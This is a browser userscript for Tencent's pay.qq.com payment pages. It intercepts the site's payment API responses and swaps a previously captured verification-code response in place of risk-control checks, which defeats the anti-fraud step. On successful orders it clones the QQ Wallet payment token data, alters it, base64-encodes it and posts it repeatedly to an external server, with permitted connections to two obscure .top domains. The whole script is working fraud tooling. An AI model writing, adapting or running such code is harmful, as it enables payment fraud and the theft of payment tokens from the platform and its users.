// ==UserScript==
// @name         长颈鹿自动传码
// @namespace    https://iiifox.me/
// @version      0.1.2
// @description  长颈鹿自动传码，此为初版，非正式版。功能待优化
// @author       iiifox
// @match        *://pay.qq.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @updateURL    https://iiifox.me/assets/giraffe/ceshichuanma_new.js
// @downloadURL  https://iiifox.me/assets/giraffe/ceshichuanma_new.js
// @connect      081w5a8cim.top
// @connect      8w0m6rjg3l.top
// ==/UserScript==

(function () {
    'use strict';

    const localStorage_CAPTURE_RESP_KEY = 'capture_pay_response';

    // ---------------- 工具函数 ----------------
    function getCapturedResponse() {
        try {
            return localStorage.getItem(localStorage_CAPTURE_RESP_KEY);
        } catch {
            return null;
        }
    }

    function setCapturedResponse(response) {
        try {
            localStorage.setItem(localStorage_CAPTURE_RESP_KEY, response);
            return true;
        } catch {
            return false;
        }
    }

    function clearCapturedResponse() {
        try {
            localStorage.removeItem(localStorage_CAPTURE_RESP_KEY);
            return true;
        } catch {
            return false;
        }
    }

    function getConfig() {
        const url = GM_getValue('requestUrl', '');
        const length = Number(GM_getValue('arrayLength', 3));
        if (!url || !length) return null;
        return {url, length};
    }

    function captureUrl() {
        try {
            const pf = new URL(window.location.href).searchParams.get('pf');
            if (!pf) return true;
            // pf 格式示例：desktop_m_qq-10009163-android-10440385-qq-1104466820-xxxx
            const match = pf.match(/^desktop_m_qq-(\d+)-android-(\d+)-/);
            if (!match) return true;
            // 不相等说明是上号的包体，不是长颈鹿包体，需要捕获
            return match[1] !== match[2];
        } catch (e) {
            return false;
        }
    }


    const rand4 = () => Math.floor(Math.random() * 10000).toString().padStart(4, '0');

    function encodeItem(item) {
        const str = JSON.stringify(item);
        const utf8Bytes = new TextEncoder().encode(str);
        let binary = String.fromCharCode(...utf8Bytes);
        return btoa(binary);
    }

    function showToast(msg, type = 'info') {
        if (!document.body) return;
        const colors = {info: '#2196F3', success: '#4CAF50', warning: '#FF9800', error: '#ff4444'};
        const toast = document.createElement('div');
        toast.textContent = msg;
        Object.assign(toast.style, {
            position: 'fixed',
            bottom: '60px',
            right: '10px',
            background: colors[type] || colors.info,
            color: '#fff',
            padding: '8px 12px',
            borderRadius: '6px',
            fontSize: '12px',
            zIndex: 10001
        });
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    }

    async function copyToClipboard(text) {
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                await navigator.clipboard.writeText(text);
            } else {
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                ta.remove();
            }
            return true;
        } catch {
            return false;
        }
    }

    // ---------------- 风险替换成功后的统一传码函数 ----------------
    function handleResponse(responseJSON) {
        const config = getConfig();
        if (!config) return;
        const {url, length} = config;
        let successCount = 0;

        const requests = Array.from({length}).map(() => {
            return new Promise(resolve => {
                const item = structuredClone(responseJSON);
                item.qqwallet_info.qqwallet_tokenId += '&' + rand4();
                const encodedData = encodeItem(item);
                GM_xmlhttpRequest({
                    method: 'POST',
                    url,
                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                    data: encodedData,
                    onload: () => {
                        successCount++;
                        resolve();
                    },
                    onerror: () => resolve()
                });
            });
        });

        Promise.all(requests).then(() => {
            showToast(`传码完成：成功 ${successCount} 次`, "success");
        });
    }

    // ---------------- 判断目标请求 ----------------
    const TARGET_PATHS = ["/web_save", "/mobile_save"];

    function isTargetUrl(url) {
        return TARGET_PATHS.some(path => url.includes(path));
    }

    // ---------------- API拦截 ----------------
    function setupAPICapture() {
        // ----------- XHR 拦截 -----------
        const origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url, ...args) {
            this._isTarget = isTargetUrl(url);
            return origOpen.call(this, method, url, ...args);
        };

        const origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function (...args) {
            if (!this._isTarget) return origSend.apply(this, args);
            const xhr = this;

            const originalOnreadystatechange = xhr.onreadystatechange;
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    try {
                        handleXhr(xhr);
                    } catch (e) {
                        console.error(e);
                    }
                }
                if (originalOnreadystatechange) originalOnreadystatechange.apply(xhr, arguments);
            };

            const originalOnload = xhr.onload;
            xhr.onload = function () {
                handleXhr(xhr);
                if (originalOnload) originalOnload.apply(xhr, arguments);
            };
            return origSend.apply(this, args);
        };

        function handleXhr(xhr) {
            const responseJSON = JSON.parse(xhr.responseText);
            const ret = responseJSON.ret;
            if (captureUrl()) {
                if (ret === 2022) {
                    setCapturedResponse(JSON.stringify(responseJSON));
                    showToast('✅ 已捕获红番茄验证码响应内容 (xhr)', "success");
                }
            } else {
                if (ret === 1138) {
                    const captured = getCapturedResponse();
                    if (captured) {
                        Object.defineProperties(xhr, {
                            responseText: {value: captured, writable: false, configurable: true},
                            response: {value: captured, writable: false, configurable: true}
                        });
                        clearCapturedResponse();
                        showToast('🔄 已将风险验证替换为验证码', 'warning');
                    } else {
                        showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                    }
                } else if (ret === 0) {
                    if (!xhr._handledXhr) {
                        xhr._handledXhr = true;
                        handleResponse(responseJSON);
                    }
                }
            }
        }

        // ----------- fetch 拦截 -----------
        const origFetch = window.fetch;
        window.fetch = async function (input, init) {
            const url = typeof input === 'string' ? input : input?.url;
            const resp = await origFetch(input, init);

            if (isTargetUrl(url)) {
                const cloned = resp.clone();
                const text = await cloned.text();
                try {
                    const json = JSON.parse(text);
                    const ret = json.ret;
                    if (captureUrl()) {
                        if (ret === 2022) {
                            setCapturedResponse(JSON.stringify(json));
                            showToast('✅ 已捕获红番茄验证码响应内容 (fetch)', "success");
                        }
                    } else {
                        if (ret === 1138) {
                            const captured = getCapturedResponse();
                            if (captured) {
                                clearCapturedResponse();
                                showToast('🔄 已将风险验证替换为验证码', 'warning');
                                return new Response(captured, {
                                    status: resp.status, statusText: resp.statusText, headers: resp.headers
                                });
                            }
                            showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                        } else if (ret === 0) {
                            handleResponse(json);
                        }
                    }
                } catch (e) {
                    console.error('fetch解析失败', e);
                }
            }
            return resp;
        };
    }

    // ---------------- 配置窗口防重复逻辑 ----------------
    function createControlPanelOnce() {
        // ✅ 只在顶层创建一次
        if (window.top !== window.self) return;

        // ✅ 如果已存在，不再创建
        if (document.getElementById('fox-config-iframe')) return;

        const html = `
<div style="background:white;padding:10px;border:1px solid #ccc;width:300px;">
    <div style="margin-bottom:8px;">
        <button id="showConfigBtn">显示配置窗口</button>
    </div>
    <div id="configPanel" style="display:none;">
        <div style="margin-bottom:5px;">
            <label>账号链接:</label>
            <input type="text" id="requestUrlInput" value="${GM_getValue('requestUrl', '')}" style="width:200px; font-size:12px;">
        </div>
        <div style="margin-bottom:5px;">
            <label>传码次数:</label>
            <input type="number" id="arrayLengthInput" value="${GM_getValue('arrayLength', '')}" style="width:50px;font-size:12px;">
        </div>
        <button id="saveConfigBtn">保存</button>
    </div>
</div>`;

        const iframeNode = document.createElement('iframe');
        iframeNode.id = 'fox-config-iframe';
        iframeNode.srcdoc = html;
        iframeNode.style.position = 'fixed';
        iframeNode.style.top = '50px';
        iframeNode.style.left = '10px';
        iframeNode.style.width = '350px';
        iframeNode.style.height = '160px';
        iframeNode.style.border = 'none';
        iframeNode.style.zIndex = 99999;
        document.body.appendChild(iframeNode);

        iframeNode.onload = () => {
            const doc = iframeNode.contentDocument;
            doc.getElementById('showConfigBtn').addEventListener('click', () => {
                const panel = doc.getElementById('configPanel');
                if (panel.style.display === 'none') {
                    panel.style.display = 'block';
                    doc.getElementById('showConfigBtn').innerText = '隐藏配置窗口';
                } else {
                    panel.style.display = 'none';
                    doc.getElementById('showConfigBtn').innerText = '显示配置窗口';
                }
            });
            doc.getElementById('saveConfigBtn').addEventListener('click', () => {
                const requestUrl = doc.getElementById('requestUrlInput').value;
                const arrayLength = doc.getElementById('arrayLengthInput').value;
                GM_setValue('requestUrl', requestUrl);
                GM_setValue('arrayLength', arrayLength);
                alert('保存成功');
            });
        };
    }

    // ---------------- 初始化 ----------------
    const wait = setInterval(() => {
        if (document.body) {
            clearInterval(wait);
            createControlPanelOnce(); // ✅ 防重复配置面板
            setupAPICapture();
        }
    }, 100);
})();
